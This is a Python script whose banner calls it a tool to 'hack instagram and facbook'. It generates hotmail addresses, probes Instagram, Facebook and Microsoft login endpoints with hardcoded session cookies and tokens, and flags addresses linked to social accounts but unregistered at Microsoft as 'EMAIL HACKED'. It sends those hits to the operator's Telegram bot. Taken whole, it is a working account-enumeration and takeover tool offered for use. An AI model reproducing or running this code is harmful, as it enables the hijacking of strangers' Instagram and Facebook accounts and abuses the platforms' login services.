# my instagram danyar.software
# my telgram danyarsoftwarw
# my snapchat vx.dana0
# program python 
#
# Agar daskaret Krd la bert nachy nawman bene 

import requests
import os
import sys
import random
import time
#from faker import Faker


url_hotmail="https://login.live.com/GetCredentialType.srf?opid=18B61A74C0399092&id=292841,292841&uiflavor=web&wa=wsignin1.0&rpsnv=13&ct=1610388946&rver=7.0.6737.0&wp=MBI_SSL&wreply=https://outlook.live.com/owa/?nlp=1&RpsCsrfState=12bddb84-565f-7363-7c1d-16ed24498974&aadredir=1&CBCXT=out&lw=1&fl=dob,flname,wld&cobrandid=90015&vv=1600&mkt=EN-US&lc=1033&uaid=9278610bfcef48f9820a8754696368a4"

url_insta='https://www.instagram.com/accounts/login/ajax/'

head_hotmail={
        "Accept":"application/json",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": "en-US,en;q=0.5",
		"client-request-id": "9278610bfcef48f9820a8754696368a4",
        "Connection": "keep-alive",
		"Content-Length":"662",
		"Content-type": "application/json; charset=utf-8",
		"Cookie": "amsc=g5/vmVcC9/jl8KpePa/LjHGDan2Px052V897HKZn96Axn3bQBbKUCVYgD6MQ83S9uNrv4aqhX/2mXsvxhDHwVlnS1S4brsfbV/+q+46FYe8seevHfLCyKDOeSWFG3nhFVh8PudCNLlX1JE5Xr2oKE3Fv1LHWEwC0XaxJ09uZSf/9eLGCoMtxPzIVbBnVZtsOEyTAwpiISy38NQ1vt+rYobNwTZx7Tx7lD8fFo8+v0tvx/MhWCF5vWF329pPX7nP9RFKVYjNnuP42WYEx+c9bEN2ENm87nsIhq3UO9gICkDRydq+wC0EhTEA0yHsPrCgn:2:3c; logonLatency=LGN01=637459857469249127; uaid=9278610bfcef48f9820a8754696368a4; MSPRequ=id=292841&lt=1610389137&co=0; MSCC=62.201.240.231-IQ; OParams=11DSFTjNDjnsWswbCyrcHAzdSQyVUoqp5gHiNAToNR0oduzzT7UDkbZCda1nCWYE*a7YWyuxXv2yHelsTodJ9KPaYlTk4grz4OiRCKpjfjQ35xnV8Bl*0Kl2*USAC0O2UPcDdnqgZMm4nfBCzzb!e2DAAAVH5!cWgQ9KDjN16BtVERiiewRK6Km*3amYiOSUnrSXb1sFaFVroIz1CLuBiPyfCweip6MCdT!wTh1ljimeYukrtyCEzQxUupDBo6ihsu3e8fZnpa6seOzy8k2cB1XCXMwBBFyacEQa1AsvueIkRRzJ72tC86d7ZkqkMh7Iwdp2MAj9cMTnjFyroavRFbjUlyiQUpkcj!GkmeeCVK*f!gIOJ5FxT7ZD40O34yKBw7dlXedLHlAhktq0fWWCLZhuXrq3rtQCQafk7ra*BpWJgAC8t6B!5!09EmPO8lwSdobhtk!FB3rYwPtFmnSrBWwtWSlAJYnZVpNHNu6CvyA7phAAH3ZU64uDhG92zcGrTSw7Jrw948plEhXznzbUWVLolM0ik2W8LvjIIISYrB*1c1AgIr2TAJ2CgnKh6hkYDZX8WHAlV0V39oRTP2*0BquEkFJgdBFAmvvUT3*VbDoGfq969jLhAR5hzs07cP8KuXKeICg**rtwbh9NmNBtoEKNUJ5c!JlCTEyFHb14Q3TAOFCwjvyQZ!K5sEYXZMsqvSMgqprjyMOkXk85z05yxUrBi5zmv*0BiWcXWRrFMBmoiSFgGE*5HkUmQHFLcf95OckHGP2fjM2sTyz5*QMETKd6!uTX8grFDnPGXJ4FA5PeJXsLhhKODr2Ld6J93RZuzkbqWiJvOLQG4RH4BTpyAB*Dr0ZART7phz39T!MXWqWHM5R*mP8c1JFOGKw5luM51hFaCiMPkleOGTEjkzp7QnKjFE!ynIxVdz!YvpwohE*t6hUttMBIfPXta3VW3dw4Eqj4nNELwMEyD*!hifeq3VSOgJjPpjde3n299z5iW47NKX4CKMIBHA4nihDbnJ!OHvELkXp!n6TVDeUnmqol3wKytMoCbPyo2oeAW89*Auh9CtlXKphgkk78aLsIkHBjwu4zh7*e0Xoyvg8k0XiyOwRjOlGG7xoh9LlLX783wFlToQoHXyHrMiR4OBJamorY2WLMDnVI1EqCDjYvpjVyAyk2UQWH9XFSoTUtIJZzZX*P2zmx*IfnXXKeWGJowbVPTTeCr*oxGjXAzndmEBw*qGqYucDg83WCoAUzTvPnDiU8n9n04X16adTgGxGGcc90BDQQ*4pmhN5gi4JgAgs852OQksIDBK15G4EvF4h82TKwweipAcnt5cjsICZ1quxpuHWbXvYmBC!sw9!h3aIlhA1CRcMcYur*j4ztkq0nyGQJettl1K!6!AjRWJfHSF2R*AIAaCcdM4bOi2ZOCa7wcsrEQ$; MSPOK=$uuid-f37b8adb-9c80-44ea-a285-8dd85b250107$uuid-cd7f0f55-8401-4a11-a686-09ad382c8b9a$uuid-7d5b4409-fed6-4857-8739-b8d809ec1025$uuid-e9cac0fb-5c3f-4d5c-8533-e7a91722f708$uuid-b66344ec-9e8d-4cf1-ab1f-27bbc99b8954$uuid-14f69474-9bcb-4a7a-893e-16c013b37277",
		"Host": "login.live.com",
		"hpgact": "0",
		"hpgid": "33",
		"Origin": "https://login.live.com",
		"Referer": "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1610388946&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d12bddb84-565f-7363-7c1d-16ed24498974&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015",
		"User-Agent":"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
        }



a    = 0
b   = 0
c    = 0
d   = 0
e   = 0
m  = 0
head_insta={
            'authority': 'www.instagram.com',
            'method': 'POST',
            'path': '/accounts/login/ajax/',
            'scheme': 'https',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7',
            'content-length': '277',
            'content-type': 'application/x-www-form-urlencoded',
           'cookie': 'ig_did=D9AD55FF-D40F-4569-8F3D-72923D6B496D; mid=X-oMXwAEAAFsGP-VB_KrvTNjqpMV; ig_nrcb=1; datr=lbztX-QwAT9uM6uzLDWzbgof; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=45246725385; csrftoken=u27l2skXxXS3smNyYh7bYQ7GZeC39zq5',
           'origin': 'https://www.instagram.com',
           'referer': 'https://www.instagram.com/accounts/login/',
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
           'sec-fetch-site': 'same-origin',
           'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
           'x-csrftoken': 'u27l2skXxXS3smNyYh7bYQ7GZeC39zq5',
           'x-ig-app-id': '936619743392459',
           'x-ig-www-claim': '0',
           'x-instagram-ajax': '7a3a3e64fa87',
           'x-requested-with': 'XMLHttpRequest'
        } 

os.system("clear")

idxow=input("Id Telgram : ")
bot=input("tokene bot : ")


def email():
    os.system("clear")
    print("")
    print("")
    print("")
    print("")
    print("CODING BY DANYAR !")
    print("")
    ani="""
    
  [  Tool for hack instagram and facbook  ]
  
  
    
    instagram : danyar.software
    snapchat : danyarsoftware
    
    
    
    
     """
    print(ani)
    print("")
    print("")
    print("------------")
    time.sleep(4)
    name=input("Name : ")
    h=[]
    ahmaw=open("email.txt","w")
   # hanasa=open("name.txt","r").readlines()
    #o=random.choice(hanasa)
    #.append(no)
   # print(h)
    
   # name=input("name :")
    #os.system("clear")
    for x in range(400):
    	x="10928374659430183274658"
    	x1=random.choice(x)
    	x2=random.choice(x)
    	x3=random.choice(x)
    	hamwi=x1+x2+x3
    	ani=name+hamwi+"@hotmail.com"
    	#print(ani)
    	ahmaw.write(ani+"\n")
    #os.system("clear")
   


def cheker_insta():
	os.system("clear")
	filer=open('email.txt','r').readlines()
	#global headd
	a = 0
	b = 0
	c = 0
	d = 0
	e = 0
	m = 0
	a2 =0
	a3 =0
	hy =0
	for x in filer:
	   	global head_hotmail
	   	global url_hotmail
	   	u=x.strip()
	   	
	   	
	   	
	   	data={
        'username': u,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }
	   	u=x.strip()
	   	global head_insta
	   	global url_insta
	   	global user_agent
	   	url_fb="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password=password&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(u)
	   	reee=requests.get(url_fb).text
	   	if "The password you entered is incorrect. Please try again." in reee:
	   		os.system("clear")
	   		a2+=1
	   		print("[ + ] ALL EMAIL 400 !")
	   		print("")
	   		print("")
	   		print("----------------")
	   		print("")
	   		print("[ ✓ ] LINKED INSTAGRAM : {}".format(a))
	   	
	   	
	   		print("------")
	   		print("[ ✓ ] LINKED FACBOOK : {}".format(a2))
	   
	  
	   		print("------")
	   		print("[ + ] LINKED FACBOOK & INSTAGRAM : {}".format(hy))
	   		print("------")
	   		print("[ x ] NOT LINKED : {}".format(b))
	   		print("------")
	   		print("[ ✓ ] EMAIL HACKED : {}".format(e))
	   		print("-------")
	   		print("[ x ] NOT HACKED : {} ".format(d))
	   		print("-------")
	   		print("[ ! ] ERORR CHECK : {}".format(m))
	   		print("-------")
	   		print("[ ✓ ] SEND EMAIL FOR TELGRAM : {}".format(e))
	   		
	  
	   	re = requests.post(url_insta,headers=head_insta,data=data).text
	 
	   	if '"message":"There was an error with your request. Please try again."' in re:
	   		os.system("clear")
	   		a+=1
	   		print("[ + ] ALL EMAIL 400 !")
	   		print("")
	   		print("")
	   		print("----------------")
	   		print("")
	   		print("[ ✓ ] LINKED INSTAGRAM : {}".format(a))
	   		
	   		print("------")
	   		print("[ ✓ ] LINKED FACBOOK : {}".format(a2))
	   		
	   		print("------")
	   		print("[ + ] LINKED FACBOOK & INSTAGRAM : {}".format(hy))
	   		print("------")
	   		print("[ x ] NOT LINKED : {}".format(b))
	   		print("------")
	   		print("[ ✓ ] EMAIL HACKED : {}".format(e))
	   		print("-------")
	   		print("[ x ] NOT HACKED : {} ".format(d))
	   		print("-------")
	   		print("[ ! ] ERORR CHECK : {}".format(m))
	   		print("-------")
	   		print("[ ✓ ] SEND EMAIL FOR TELGRAM : {}".format(e))
	   	
	   	if '"user":true' in re:
	   		
	   		if "The password you entered is incorrect. Please try again." in reee:
	   			os.system("clear")
	   			hy+=1
	   			print("[ + ] ALL EMAIL 400 !")
	   			print("")
	   			print("")
	   			print("----------------")
	   			print("")
	   			print("[ ✓ ] LINKED INSTAGRAM: {}".format(a))

	   			print("------")
	   			print("[ ✓ ] LINKED FACBOOK : {}".format(a2))
	   			
	   			print("------")
	   			print("[ + ] LINKED FACBOOK & INSTAGRAM : {}".format(hy))
	   			print("------")
	   			print("[ x ] NOT LINKED : {}".format(b))
	   			print("------")
	   			print("[ ✓ ] EMAIL HACKED : {}".format(e))
	   			print("-------")
	   			print("[ x ] NOT HACKED : {} ".format(d))
	   			print("-------")
	   			print("[ ! ] ERORR CHECK : {}".format(m))
	   			print("-------")
	   			print("[ ✓ ] SEND EMAIL FOR TELGRAM : {}".format(e))
	   			
	   			
	   	if '"message":"There was an error with your request. Please try again."' in re:
	   	
	   		on={
	"checkPhones": "false",
	"federationFlags": "3",
	"flowToken": "DXfLqm3TrA3KeBHTFkW5zuzzLr4Qg6BD4ws3rURUNm*rcrojXs0H!FXZxfQTcGJRyZKwZMEvQU88DaDPqP10jnT8zJb*vd29s47WjtXgRS5Bqe7SOujr!QWoimdIaIm6KCtWzbNCm6OYTyZzPZ!XE9UQ2PXa5yMCXYZiOMHXOXSmTuE8G1I3*DMPvo7bX94P**IZVGqXJc1GGc2G!c5C8rPrLMsR7imubNzqjChZmpnYJPRk5IUA0ZfRUkn3H9D1ei2MkFrUHEYbIQCR83yD6bQ$",
	"forceotclogin": "false",
	"isCookieBannerShown": "false",
	"isExternalFederationDisallowed": "false",
	"isFidoSupported": "false",
	"isOtherIdpSupported": "true",
	"isRemoteConnectSupported": "false",
	"isRemoteNGCSupported": "true",
	"isSignup": "false",
	"otclogindisallowed": "false",
	"uaid": "9278610bfcef48f9820a8754696368a4",
	"username":u
	   		}
	   		
	   		dyar=requests.post(url=url_hotmail,headers=head_hotmail,json=on).text
	   		if '"IfExistsResult":0' in dyar:
	   			os.system("clear")
	   			d+=1
	   			print("[ + ] ALL EMAIL 400 !")
	   			print("")
	   			print("")
	   			print("----------------")
	   			print("")
	   			print("[ ✓ ] LINKED INSTAGRAM : {}".format(a))
	   			print("------")
	   			print("[ ✓ ] LINKED FACBOOK : {}".format(a2))
	   			print("------")
	   			print("[ + ] LINKED FACBOOK & INSTAGRAM : {}".format(hy))
	   			print("------")
	   			print("[ x ] NOT LINKED : {}".format(b))
	   			print("-------")
	   			print("[ ✓ ] EMAIL HACKED : {}".format(e))
	   			print("-------")
	   			print("[ x ] NOT HACKED : {} ".format(d))
	   			print("-------")
	   			print("[ ! ] ERORR CHECK : {}".format(m))
	   			print("-------")
	   			print("[ ✓ ] SEND EMAIL FOR TELGRAM : {}".format(e))
	   		
	   		if '"IfExistsResult":1' in dyar:
	   			
	   			os.system("clear")
	   			e+=1
	   			print("[ + ] ALL EMAIL 400 !")
	   			print("")
	   			print("")
	   			print("----------------")
	   			print("")
	   			print("[ ✓ ] LINKED INSTAGRAM: {}".format(a))

	   			print("------")
	   			print("[ ✓ ] LINKED FACBOOK : {}".format(a2))
	   		
	   			print("------")
	   			print("[ + ] LINKED FACBOOK & INSTAGRAM : {}".format(hy))
	   			print("------")
	   			print("[ x ] NOT LINKED : {}".format(b))
	   			print("[ ✓ ] EMAIL HACKED : {}".format(e))
	   			print("-------")
	   			print("[ x ] NOT HACKED : {} ".format(d))
	   			print("-------")
	   			print("[ ! ] ERORR CHECK : {}".format(m))
	   			print("-------")
	   			print("[ ✓ ] SEND EMAIL FOR TELGRAM : {}".format(e))
	   			bot_message = "Email : "+u+"\nInstagram : true \n "
	   			bot_token = bot
	   			bot_chatID = idxow
	   			send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
	   			response = requests.get(send_text)
	   		
	   		
	   		
	   		
	   		
	   		
	   	if '"message":"There was an error with your request. Please try again."' in re:
	   		if "The password you entered is incorrect. Please try again." in reee:
	   			hh={
	"checkPhones": "false",
	"federationFlags": "3",
	"flowToken": "DXfLqm3TrA3KeBHTFkW5zuzzLr4Qg6BD4ws3rURUNm*rcrojXs0H!FXZxfQTcGJRyZKwZMEvQU88DaDPqP10jnT8zJb*vd29s47WjtXgRS5Bqe7SOujr!QWoimdIaIm6KCtWzbNCm6OYTyZzPZ!XE9UQ2PXa5yMCXYZiOMHXOXSmTuE8G1I3*DMPvo7bX94P**IZVGqXJc1GGc2G!c5C8rPrLMsR7imubNzqjChZmpnYJPRk5IUA0ZfRUkn3H9D1ei2MkFrUHEYbIQCR83yD6bQ$",
	"forceotclogin": "false",
	"isCookieBannerShown": "false",
	"isExternalFederationDisallowed": "false",
	"isFidoSupported": "false",
	"isOtherIdpSupported": "true",
	"isRemoteConnectSupported": "false",
	"isRemoteNGCSupported": "true",
	"isSignup": "false",
	"otclogindisallowed": "false",
	"uaid": "9278610bfcef48f9820a8754696368a4",
	"username":u
	   		}
	   			wana=requests.post(url=url_hotmail,headers=head_hotmail,json=hh).text
	   			if '"IfExistsResult":1' in wana:
	   				os.system("clear")
	   				e+=1
	   				print("[ + ] ALL EMAIL 400 !")
	   				print("")
	   				print("")
	   				print("----------------")
	   				print("")
	   				print("[ ✓ ] LINKED INSTAGRAM: {}".format(a))
	   				print("------")
	   				print("[ ✓ ] LINKED FACBOOK : {}".format(a2))
	   				print("------")
	   				print("------")
	   				print("[ + ] LINKED FACBOOK & INSTAGRAM : {}".format(hy))
	   				print("------")
	   				print("[ x ] NOT LINKED : {}".format(b))
	   				print("------")
	   				print("[ ✓ ] EMAIL HACKED : {}".format(e))
	   				print("-------")
	   				print("[ x ] NOT HACKED : {} ".format(d))
	   				print("-------")
	   				print("[ ! ] ERORR CHECK : {}".format(m))
	   				print("-------")
	   				print("[ ✓ ] SEND EMAIL FOR TELGRAM : {}".format(e))
	   				bot_message = "Email : "+u+"\nFacbook : true \nInstagram : true"
	   				bot_token = bot
	   				bot_chatID = idxow
	   				send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
	   				response = requests.get(send_text)
	   			
	   			
	   	
	   			
	   		
	   		
	   		
	   		
	   		
	  
	  
	  
	  
	  
	   	
	   	if "The password you entered is incorrect. Please try again." in reee:
	   		jjson={
	"checkPhones": "false",
	"federationFlags": "3",
	"flowToken": "DXfLqm3TrA3KeBHTFkW5zuzzLr4Qg6BD4ws3rURUNm*rcrojXs0H!FXZxfQTcGJRyZKwZMEvQU88DaDPqP10jnT8zJb*vd29s47WjtXgRS5Bqe7SOujr!QWoimdIaIm6KCtWzbNCm6OYTyZzPZ!XE9UQ2PXa5yMCXYZiOMHXOXSmTuE8G1I3*DMPvo7bX94P**IZVGqXJc1GGc2G!c5C8rPrLMsR7imubNzqjChZmpnYJPRk5IUA0ZfRUkn3H9D1ei2MkFrUHEYbIQCR83yD6bQ$",
	"forceotclogin": "false",
	"isCookieBannerShown": "false",
	"isExternalFederationDisallowed": "false",
	"isFidoSupported": "false",
	"isOtherIdpSupported": "true",
	"isRemoteConnectSupported": "false",
	"isRemoteNGCSupported": "true",
	"isSignup": "false",
	"otclogindisallowed": "false",
	"uaid": "9278610bfcef48f9820a8754696368a4",
	"username":u
	   		}
	   		
	   		
	   		awenn=requests.post(url=url_hotmail,headers=head_hotmail,json=jjson).text
	   		if '"IfExistsResult":1' in awenn:
	   			os.system("clear")
	   			e+=1
	   			print("[ + ] ALL EMAIL 400 !")
	   			print("")
	   			print("")
	   			print("----------------")
	   			print("")
	   			print("[ ✓ ] LINKED INSTAGRAM: {}".format(a))
	   			print("------")
	   			print("[ ✓ ] LINKED FACBOOK : {}".format(a2))
	   			print("------")
	   			print("[ + ] LINKED FACBOOK & INSTAGRAM : {}".format(hy))
	   			print("------")
	   			print("[ x ] NOT LINKED : {}".format(b))
	   			print("------")
	   			print("[ ✓ ] EMAIL HACKED : {}".format(e))
	   			print("-------")
	   			
	   			print("[ x ] NOT HACKED : {} ".format(d))
	   			print("-------")
	   			
	   			print("[ ! ] ERORR CHECK : {}".format(m))
	   			print("-------")
	   			print("[ ✓ ] SEND EMAIL FOR TELGRAM : {}".format(e))
	   			bot_message = "Email : "+u+"\nFacbook : true \n "
	   			bot_token = bot
	   			bot_chatID = idxow
	   			send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
	   			response = requests.get(send_text)
	   	
	   	else:
	   		os.system("clear")
	   		b+=1
	   		a3+=1
	   		print("[ + ] ALL EMAIL 400 !")
	   		print("")
	   		print("")
	   		print("----------------")
	   		print("")
	   		print("[ ✓ ] LINKED INSTAGRAM: {}".format(a))
	   		print("------")
	   		print("[ ✓ ] LINKED FACBOOK : {}".format(a2))
	   		print("------")
	   		print("[ + ] LINKED FACBOOK & INSTAGRAM : {}".format(hy))
	   		print("------")
	   		print("[ x ] NOT LINKED : {}".format(b))
	   		print("------")
	   		print("[ ✓ ] EMAIL HACKED : {}".format(e))
	   		print("-------")
	   			
	   		print("[ x ] NOT HACKED : {} ".format(d))
	   		print("-------")
	   			
	   		print("[ ! ] ERORR CHECK : {}".format(m))
	   		print("-------")
	   		print("[ ✓ ] SEND EMAIL FOR TELGRAM : {}".format(e))
	   	
	   			
	   			
	   				
	   			
	   		




	   		

	   		
	   		
	   		
	   	
def chk():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1mYour ID : "+id)
  try:
    httpCaht = requests.get("https://textuploader.com/187w2/raw").text
    if id in httpCaht:
      print("\x1b[37;1mYOUR ID IS ACTIVE.........")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else:
      print("\x1b[37;1mYOUR ID IS NOT ACTIVE.........")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
 





	   		
	 
	  
email()
cheker_insta()
exit()